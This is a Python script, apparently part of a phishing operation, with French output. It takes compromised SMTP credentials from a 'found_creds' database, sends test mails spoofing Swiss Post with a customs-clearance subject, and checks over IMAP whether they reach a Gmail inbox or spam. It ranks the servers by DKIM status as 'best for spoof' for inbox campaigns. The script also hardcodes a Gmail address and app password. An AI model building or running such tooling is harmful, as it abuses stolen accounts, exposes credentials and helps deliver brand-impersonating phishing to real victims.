#!/usr/bin/env python3
"""
RE-CHECK v2: Verify INBOX SMTPs + detect DKIM signatures.
Reclassify: INBOX with DKIM server → likely spam in real usage.
"""
import sqlite3
import time
import uuid
import ssl
import smtplib
import imaplib
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

DB_PATH = "/opt/darkvasend/bustgo-hunt.db"

GMAIL_CHECKER = {
    "email": "Malik.elmathy@gmail.com",
    "password": "pqnpfihscgxonwwf",
    "imap_host": "imap.gmail.com",
    "imap_port": 993,
}

def strip_tld(email):
    if "@" not in email:
        return email
    local, domain = email.rsplit("@", 1)
    parts = domain.split(".")
    return f"{local}@{parts[0]}" if len(parts) > 1 else email


def send_test(smtp_info, marker, checker_email):
    host = smtp_info["smtp_host"]
    port = smtp_info["smtp_port"]
    user = smtp_info["smtp_user"]
    password = smtp_info["smtp_password"]

    actual_from = strip_tld("notifications@post.ch")
    tracked_subject = f"Votre envoi est en cours de dedouanement [DK-{marker}]"

    msg = MIMEMultipart("alternative")
    msg["Subject"] = tracked_subject
    msg["From"] = f"Post CH SA <{actual_from}>"
    msg["To"] = checker_email
    msg["Reply-To"] = "notifications@post.ch"
    msg["Message-ID"] = f"<dk-{marker}@recheck>"
    msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
    msg["X-Mailer"] = "Microsoft Outlook 16.0"
    msg["MIME-Version"] = "1.0"
    msg.attach(MIMEText("Swiss Post DKIM detection test", "plain", "utf-8"))
    msg.attach(MIMEText("<html><body><p>Swiss Post verification test</p></body></html>", "html", "utf-8"))

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=15, context=ctx)
        else:
            server = smtplib.SMTP(host, port, timeout=15)
            server.ehlo()
            try:
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            except Exception:
                pass
        server.login(user, password)
        server.sendmail(user, [checker_email], msg.as_string())
        server.quit()
        return True, ""
    except Exception as e:
        return False, f"{type(e).__name__}: {str(e)[:50]}"


def check_delivery_with_dkim(markers):
    """Check delivery (SPAM first) + fetch DKIM info from Authentication-Results."""
    results = {}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        imap = imaplib.IMAP4_SSL(
            GMAIL_CHECKER["imap_host"], GMAIL_CHECKER["imap_port"],
            ssl_context=ctx, timeout=30,
        )
        imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

        def _fetch_dkim(msg_id):
            try:
                st, data = imap.fetch(msg_id, "(BODY.PEEK[HEADER.FIELDS (AUTHENTICATION-RESULTS)])")
                if data and data[0] and isinstance(data[0], tuple):
                    raw = data[0][1].decode("utf-8", errors="replace")
                    has_dkim = "dkim=pass" in raw.lower()
                    dkim_domain = ""
                    dm = re.search(r"dkim=pass.*?header\.(?:d|i)=@?([^\s;]+)", raw, re.I | re.S)
                    if dm:
                        dkim_domain = dm.group(1).strip()
                    spf = "spf=pass" in raw.lower()
                    return has_dkim, dkim_domain, spf, raw.strip()[:200]
            except Exception:
                pass
            return False, "", False, ""

        # SPAM first
        st, _ = imap.select("[Gmail]/Spam", readonly=True)
        if st == "OK":
            for m in markers:
                st2, ids = imap.search(None, f'SUBJECT "DK-{m}"')
                if st2 == "OK" and ids[0] and ids[0].strip():
                    msg_id = ids[0].decode().split()[-1]
                    has_dkim, dkim_d, spf, raw_auth = _fetch_dkim(msg_id)
                    results[m] = {"delivery": "spam", "dkim": has_dkim, "dkim_domain": dkim_d, "spf": spf, "raw": raw_auth}

        # Then INBOX
        remaining = [m for m in markers if m not in results]
        if remaining:
            st, _ = imap.select("INBOX", readonly=True)
            if st == "OK":
                for m in remaining:
                    st2, ids = imap.search(None, f'SUBJECT "DK-{m}"')
                    if st2 == "OK" and ids[0] and ids[0].strip():
                        msg_id = ids[0].decode().split()[-1]
                        has_dkim, dkim_d, spf, raw_auth = _fetch_dkim(msg_id)
                        results[m] = {"delivery": "inbox", "dkim": has_dkim, "dkim_domain": dkim_d, "spf": spf, "raw": raw_auth}

        imap.logout()
    except Exception as e:
        print(f"  [IMAP ERROR] {e}")
    return results


def main():
    db = sqlite3.connect(DB_PATH, timeout=10)
    db.row_factory = sqlite3.Row

    rows = db.execute(
        "SELECT id, domain, provider, smtp_host, smtp_port, smtp_user, smtp_password, context "
        "FROM found_creds WHERE auth_ok=1"
    ).fetchall()

    inbox_smtps = []
    for r in rows:
        ctx = r["context"] or ""
        if "INBOX" in ctx:
            inbox_smtps.append(dict(r))

    if not inbox_smtps:
        print("Aucun SMTP INBOX.")
        return

    print(f"{'='*60}")
    print(f"  DKIM RE-CHECK: {len(inbox_smtps)} SMTP INBOX")
    print(f"{'='*60}\n")

    checker = GMAIL_CHECKER["email"]
    markers = {}

    print("PHASE 1: Envoi des tests...")
    for s in inbox_smtps:
        marker = uuid.uuid4().hex[:8]
        ok, err = send_test(s, marker, checker)
        if ok:
            markers[marker] = s
            print(f"  #{s['id']} {s['smtp_host']} -> OK (DK-{marker})")
        else:
            print(f"  #{s['id']} {s['smtp_host']} -> ECHEC: {err}")

    if not markers:
        print("\nAucun email envoye.")
        db.close()
        return

    print(f"\nPHASE 2: Attente 90s...")
    time.sleep(90)

    print(f"\nPHASE 3: Check IMAP + DKIM ({len(markers)} markers)...")
    results = check_delivery_with_dkim(list(markers.keys()))

    missing = [m for m in markers if m not in results]
    if missing:
        print(f"  {len(missing)} manquants — retry 30s...")
        time.sleep(30)
        r2 = check_delivery_with_dkim(missing)
        results.update(r2)

    # Double-check inbox
    inbox_markers = [m for m, r in results.items() if r["delivery"] == "inbox"]
    if inbox_markers:
        print(f"\nPHASE 4: Double-check {len(inbox_markers)} INBOX (45s)...")
        time.sleep(45)
        recheck = check_delivery_with_dkim(inbox_markers)
        for m, r in recheck.items():
            if r["delivery"] == "spam":
                results[m] = r
                print(f"  DK-{m}: INBOX -> SPAM reclassifie!")

    print(f"\n{'='*60}")
    print(f"  RESULTATS DKIM RE-CHECK")
    print(f"{'='*60}\n")

    for marker, s in markers.items():
        r = results.get(marker)
        cred_id = s["id"]
        if not r:
            print(f"  #{cred_id} {s['smtp_host']:<25} {s['smtp_user'][:25]:<25} -> NOT FOUND")
            continue

        delivery = r["delivery"].upper()
        dkim_str = f"DKIM={r['dkim_domain']}" if r["dkim"] else "NO_DKIM"
        spf_str = "SPF=pass" if r["spf"] else "SPF=?"
        
        # Determine risk
        if r["delivery"] == "inbox" and not r["dkim"]:
            risk = "SAFE (inbox + no dkim)"
        elif r["delivery"] == "inbox" and r["dkim"]:
            risk = "RISKY (inbox now, but dkim may cause spam later)"
        elif r["delivery"] == "spam":
            risk = "SPAM"
        else:
            risk = "?"

        print(f"  #{cred_id} {s['smtp_host']:<25} {s['smtp_user'][:25]:<25}")
        print(f"       {delivery} | {spf_str} | {dkim_str} | {risk}")

        # Update DB context with DKIM info
        old_ctx = s["context"] or ""
        if r["delivery"] == "spam" and "INBOX" in old_ctx:
            new_ctx = old_ctx.replace("SPOOF_INBOX", "SPOOF_SPAM").replace("BASIQUE_INBOX", "BASIQUE_SPAM")
            db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, cred_id))
            print(f"       -> RECLASSIFIE: INBOX -> SPAM dans la DB")

    db.commit()

    # Summary
    inbox_nodkim = sum(1 for m, r in results.items() if r.get("delivery") == "inbox" and not r.get("dkim"))
    inbox_dkim = sum(1 for m, r in results.items() if r.get("delivery") == "inbox" and r.get("dkim"))
    spam_count = sum(1 for m, r in results.items() if r.get("delivery") == "spam")
    not_found = len(markers) - len(results)

    print(f"\n{'='*60}")
    print(f"  INBOX NO_DKIM (meilleur pour spoof):  {inbox_nodkim}")
    print(f"  INBOX DKIM (risque futur spam):        {inbox_dkim}")
    print(f"  SPAM:                                  {spam_count}")
    print(f"  Non arrives:                           {not_found}")
    print(f"{'='*60}")
    print(f"\n  CONCLUSION: Prioriser les {inbox_nodkim} SMTP NO_DKIM pour les campagnes INBOX")

    db.close()


if __name__ == "__main__":
    main()
